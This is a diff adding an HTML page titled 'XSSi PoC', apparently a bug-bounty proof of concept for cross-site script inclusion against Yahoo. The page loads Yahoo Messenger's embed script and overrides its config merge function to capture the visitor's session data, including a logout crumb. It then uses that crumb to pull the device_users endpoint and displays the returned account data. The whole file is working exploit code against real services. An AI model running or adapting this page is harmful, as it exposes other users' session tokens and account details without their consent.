@@ -1,0 +1,33 @@
+<html>
+    <head>
+        <title>XSSi PoC</title>
+    </head>
+    <body>
+        <div style="width: 60%; margin-right: auto; margin-left: auto; margin-bottom: 30px;">
+            <h1 style="text-align: center;">Proof of Concept</h1>
+            <b>Dataset 1:</b>
+            <div id="content1" style="width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;"></div>
+            <br/>
+            <b>Dataset 2:</b>
+            <div id="content2" style="width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;"></div>
+        </div>
+        <script>
+            function processDeviceUsers(data) {
+                document.getElementById("content1").innerHTML = JSON.stringify(data);
+            }
+            window.onload = function () {
+                var config = {};
+                config_data = {};
+                config.merge = function(data) { config_data = data };
+                iris.initConfig(config);
+                document.getElementById("content2").innerHTML =  JSON.stringify(config_data);
+                var src = "https://jsapi.login.yahoo.com/w/device_users?.crumb=" + config_data.session.logoutCrumb;
+                var s = document.createElement('script');
+                s.setAttribute('src', src);
+                document.body.appendChild(s);
+            }
+        </script>
+        <script src="https://messenger.yahoo.com/embed/app.js"></script>
+        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    </body>
+</html>
